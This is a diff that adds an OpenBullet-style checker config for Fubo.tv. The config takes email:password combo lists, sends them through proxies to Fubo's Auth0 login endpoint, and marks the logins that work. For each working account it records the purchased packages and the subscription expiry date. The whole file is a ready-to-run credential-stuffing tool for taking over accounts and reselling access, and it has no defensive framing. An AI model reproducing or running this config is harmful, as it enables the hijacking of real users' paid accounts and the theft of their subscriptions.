@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Fubo.tv",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-12T13:47:15.4684713+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL REQUEST POST "https://fubo.auth0.com/oauth/ro" AutoRedirect=TRUE 
+  CONTENT "{\"connection\":\"Username-Password-Authentication\",\"username\":\"<USER>\",\"scope\":\"user openid offline_access\",\"grant_type\":\"password\",\"device\":\"android-device\",\"client_id\":\"d6YiOzgcOnC305cKkBZoydAu62K1z7Ly\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/2.7.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Auth0-RequestId: aa3389bb0326107a1c2e" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "invalid_user_password" 
+    KEY "error_description" 
+    KEY "Wrong email or password." 
+    KEY "error" 
+    KEY "activated\":false" 
+    KEY "Access Denined" 
+  KEYCHAIN Success OR 
+    KEY "bearer" 
+#ID_TOKEN PARSE "<SOURCE>" LR "{\"id_token\":\"" "\"," Recursive=FALSE -> VAR "id_token" "" "" 
+#TOKEN_URL REQUEST POST "https://fubo.auth0.com/tokeninfo" AutoRedirect=TRUE 
+  CONTENT "{\"id_token\":\"<id_token>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/2.7.5" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Auth0-RequestId: aa3389bb0326107a1c2e" 
+#PACKAGES PARSE "<SOURCE>" JSON "purchased_packages" Recursive=FALSE -> CAP "purchased_packages" "" "" 
+#EXPIRES PARSE "<SOURCE>" JSON "current_period_ends_at" Recursive=FALSE -> CAP "current_period_ends_at" "" "" 
